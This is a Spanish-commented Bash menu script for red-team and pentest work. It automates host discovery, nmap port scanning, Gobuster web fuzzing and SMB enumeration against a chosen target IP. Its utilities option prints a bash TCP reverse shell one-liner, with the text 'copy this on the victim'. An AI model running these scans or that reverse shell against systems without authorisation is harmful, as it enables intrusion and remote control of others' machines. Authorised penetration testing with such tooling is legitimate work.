#!/bin/bash

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Variables Globales
TARGET=""
INTERFACE=$(ip route show | grep default | awk '{print $5}' | head -n 1)
WORK_DIR=$(pwd)

# Trampa para CTRL+C
trap ctrl_c INT
function ctrl_c(){
    echo -e "\n${RED}[!] Saliendo...${NC}"
    exit 1
}

# Banner
function banner {
    clear
    echo -e "${RED}"
    cat << "EOF"
        d8888          888               .d8888b.                           d8b  .d888 
       d88888          888              d88P  Y88b                          Y8P d88P"  
      d88P888          888              Y88b.                                   888    
     d88P 888 888  888 888888  .d88b.    "Y888b.    .d8888b  8888b.  88888b.  888 888888 888  888
    d88P  888 888  888 888    d88""88b      "Y88b. d88P"        "88b 888 "88b 888 888    888  888
   d88P   888 888  888 888    888  888        "888 888      .d888888 888  888 888 888    888  888
  d8888888888 Y88b 888 Y88b.  Y88..88P Y88b  d88P Y88b.     888  888 888  888 888 Y88b   Y88b 888
 d88P     888  "Y88888  "Y888  "Y88P"   "Y8888P"   "Y8888P "Y888888 888  888 888  "Y88888 "Y88888
EOF
    echo -e "${NC}"
    echo -e "${BLUE}Script de Automatización para Red Team & Pentesting${NC}"
    echo -e "${YELLOW}Interfaz detectada: $INTERFACE${NC}"
    echo -e "${YELLOW}Directorio actual: $WORK_DIR${NC}"
    if [ ! -z "$TARGET" ]; then
        echo -e "${GREEN}Objetivo Actual: $TARGET${NC}"
    fi
    echo "---------------------------------------------------------"
}

# Verifica si somos root
if [ "$EUID" -ne 0 ]; then 
    echo -e "${RED}[!] Por favor, ejecuta este script como root.${NC}"
    exit
fi

# Función para definir el objetivo (se llama al inicio o desde el menú)
function setTarget {
    if [ -z "$TARGET" ]; then
        read -p "Introduce la IP del Objetivo (Target): " TARGET
    fi
    
    # Crear estructura de carpetas
    if [ ! -d "$TARGET" ]; then
        echo -e "${BLUE}[*] Creando directorio de trabajo para $TARGET...${NC}"
        mkdir -p "$TARGET/nmap"
        mkdir -p "$TARGET/web"
        mkdir -p "$TARGET/loot"
        mkdir -p "$TARGET/exploits"
    fi
}

# 1. Escaneo de Red Local (Host Discovery)
function escaneoRed {
    echo -e "${YELLOW}[*] Realizando descubrimiento de hosts en la red local...${NC}"
    # Intenta usar arp-scan, si no netdiscover o ping sweep
    arp-scan -I $INTERFACE --localnet --ignoredups
    echo ""
    read -p "Presiona Enter para continuar..."
}

# 2. Escaneo de Puertos (Nmap inteligente)
function nmapFlow {
    setTarget
    echo -e "${YELLOW}[*] Paso 1: Escaneo rápido de todos los puertos TCP...${NC}"
    
    nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv $TARGET -oG "$TARGET/nmap/allPorts"
    
    echo -e "${YELLOW}[*] Extrayendo puertos abiertos...${NC}"
    ports=$(grep -oP '\d{1,5}/open' "$TARGET/nmap/allPorts" | awk '{print $1}' FS='/' | xargs | tr ' ' ',')
    
    if [ -z "$ports" ]; then
        echo -e "${RED}[!] No se encontraron puertos abiertos o el host está caído.${NC}"
        read -p "Presiona Enter para volver..."
        return
    fi

    echo -e "${GREEN}[+] Puertos encontrados: $ports${NC}"
    echo -e "${YELLOW}[*] Paso 2: Escaneo detallado de servicios y scripts (sC sV) en puertos detectados...${NC}"
    
    nmap -sC -sV -p$ports -Pn $TARGET -oN "$TARGET/nmap/detailed"
    
    echo -e "${GREEN}[+] Escaneo completado. Resultados guardados en $TARGET/nmap/detailed${NC}"
    read -p "Presiona Enter para continuar..."
}

# 3. Fuzzing Web (Gobuster)
function enumWeb {
    setTarget
    echo -e "${YELLOW}[*] Iniciando búsqueda de directorios con Gobuster...${NC}"
    read -p "¿Puerto web (80/443/8080)? [Default: 80]: " wport
    wport=${wport:-80}
    
    # Diccionario común en Kali
    wordlist="/usr/share/wordlists/dirb/common.txt"
    
    if [ -f "$wordlist" ]; then
        gobuster dir -u http://$TARGET:$wport -w $wordlist -x php,html,txt,sh -o "$TARGET/web/gobuster_scan.txt"
    else
        echo -e "${RED}[!] No se encontró el diccionario common.txt. Instalando wordlists...${NC}"
        apt install wordlists -y
    fi
    echo -e "${GREEN}[+] Escaneo web finalizado.${NC}"
    read -p "Presiona Enter para continuar..."
}

# 4. Enumeración SMB
function enumSMB {
    setTarget
    echo -e "${YELLOW}[*] Enumerando SMB con enum4linux...${NC}"
    enum4linux -a $TARGET | tee "$TARGET/loot/smb_enum.txt"
    echo -e "${GREEN}[+] Enumeración guardada en $TARGET/loot/smb_enum.txt${NC}"
    read -p "Presiona Enter para continuar..."
}

# 5. Utilidades Rápidas
function utilidades {
    echo -e "${YELLOW}--- Utilidades Rápidas ---${NC}"
    echo "1. Levantar Servidor HTTP (Python 3) en puerto 80"
    echo "2. Ver mis IPs"
    echo "3. Generar Reverse Shell Básica (Bash TCP)"
    read -p "Selecciona: " util_opt
    
    case $util_opt in
        1)
            echo -e "${GREEN}[+] Sirviendo directorio actual en puerto 80...${NC}"
            python3 -m http.server 80
            ;;
        2)
            echo -e "${BLUE}IP Local:${NC} $(ip a show $INTERFACE | grep "inet " | awk '{print $2}')"
            echo -e "${BLUE}IP Pública:${NC} $(curl -s ifconfig.me)"
            read -p "Enter..."
            ;;
        3) 
            read -p "Tu IP (LHOST): " lhost
            read -p "Tu Puerto (LPORT): " lport
            echo -e "${YELLOW}Copia esto en la víctima:${NC}"
            echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
            read -p "Enter..."
            ;;
    esac
}

# Bucle Principal
while true; do
    banner
    echo "1. Escaneo de Red Local (ARP/Discovery)"
    echo "2. Definir/Cambiar Objetivo (TARGET IP)"
    echo "3. Escaneo Completo Nmap (Auto-Extract Ports)"
    echo "4. Enumeración Web (Gobuster)"
    echo "5. Enumeración SMB (Enum4linux)"
    echo "6. Utilidades Red Team (Srv HTTP, RevShells...)"
    echo "7. Salir"
    echo ""
    read -p "Selecciona una opción: " opcion

    case $opcion in
        1) escaneoRed ;;
        2) TARGET=""; setTarget ;;
        3) nmapFlow ;;
        4) enumWeb ;;
        5) enumSMB ;;
        6) utilidades ;;
        7) echo -e "${RED}Happy Hacking!${NC}"; exit 0 ;;
        *) echo "Opción no válida." ;;
    esac
done
